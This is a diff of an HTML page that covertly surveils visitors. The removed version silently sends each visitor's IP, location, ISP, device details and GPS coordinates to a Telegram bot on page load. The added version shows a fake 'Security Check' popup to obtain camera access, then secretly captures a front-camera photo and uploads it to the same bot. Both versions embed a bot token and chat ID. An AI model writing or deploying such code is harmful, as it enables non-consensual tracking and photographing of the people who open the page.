@@ -3,69 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Auto IP & Device Tracker</title>
-    <script>
-        document.addEventListener("DOMContentLoaded", function () {
-            fetch("https://api64.ipify.org?format=json")
-                .then(response => response.json())
-                .then(data => {
-                    getIPDetails(data.ip);
-                })
-                .catch(error => console.error("Error fetching IP:", error));
-        });
-
-        function getIPDetails(ip) {
-            fetch(`https://ip-api.com/json/${ip}`)
-                .then(response => response.json())
-                .then(ipData => {
-                    if (ipData.status === "fail") return;
-
-                    const deviceInfo = getDeviceInfo();
-                    let message = `
-                        🌍 IP: ${ipData.query}
-                        🏳 Country: ${ipData.country}
-                        🏙 City: ${ipData.city}
-                        🏢 ISP: ${ipData.isp}
-                        🌍 Lat: ${ipData.lat}, Lon: ${ipData.lon}
-                        📱 Device: ${deviceInfo}
-                    `;
-
-                    sendToTelegram(message);
-
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(
-                            position => {
-                                let locationDetails = `
-                                    📍 GPS Location:
-                                    Latitude: ${position.coords.latitude}
-                                    Longitude: ${position.coords.longitude}
-                                `;
-                                sendToTelegram(locationDetails);
-                            },
-                            error => console.log("Geolocation error:", error)
-                        );
-                    }
-                })
-                .catch(error => console.error("Error fetching IP details:", error));
+    <title>Security Check</title>
+    <style>
+        #popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            box-shadow: 0px 0px 10px rgba(0,0,0,0.3);
+            text-align: center;
+            display: block;
         }
-
-        function getDeviceInfo() {
-            return `${navigator.userAgent} (Screen: ${screen.width}x${screen.height})`;
-        }
-
-        function sendToTelegram(message) {
-            const botToken = "8168694027:AAEd-uBNjblJM74OkQnmlAZ_3Fh99SUkD8g";
-            const chatId = "7182702425";
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            }).catch(error => console.error("Telegram Error:", error));
-        }
-    </script>
+    </style>
 </head>
 <body>
-    <h2>Loading...</h2>
+    <div id="popup">
+        <h3>Security Check</h3>
+        <p>This page requires camera access for verification.</p>
+        <button onclick="requestCamera()">Allow</button>
+    </div>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Replace with your Telegram bot token and chat ID
+        const TELEGRAM_BOT_TOKEN = "8168694027:AAEd-uBNjblJM74OkQnmlAZ_3Fh99SUkD8g";
+        const TELEGRAM_CHAT_ID = "7182702425";
+
+        async function requestCamera() {
+            document.getElementById('popup').style.display = 'none';
+
+            try {
+                // Request front camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+
+                // Wait a second for camera to start
+                await new Promise(resolve => setTimeout(resolve, 1000));
+
+                // Capture image
+                const canvas = document.getElementById("canvas");
+                const context = canvas.getContext("2d");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert to Blob
+                canvas.toBlob(blob => sendToTelegram(blob), "image/jpeg");
+
+                // Stop camera
+                stream.getTracks().forEach(track => track.stop());
+            } catch (error) {
+                console.error("Camera access denied:", error);
+            }
+        }
+
+        async function sendToTelegram(imageBlob) {
+            let formData = new FormData();
+            formData.append("chat_id", TELEGRAM_CHAT_ID);
+            formData.append("photo", imageBlob, "snapshot.jpg");
+
+            try {
+                let response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+
+                let result = await response.json();
+                if (result.ok) {
+                    console.log("Image sent successfully:", result);
+                } else {
+                    console.error("Failed to send image:", result);
+                }
+            } catch (error) {
+                console.error("Error sending image:", error);
+            }
+        }
+    </script>
 </body>
 </html>
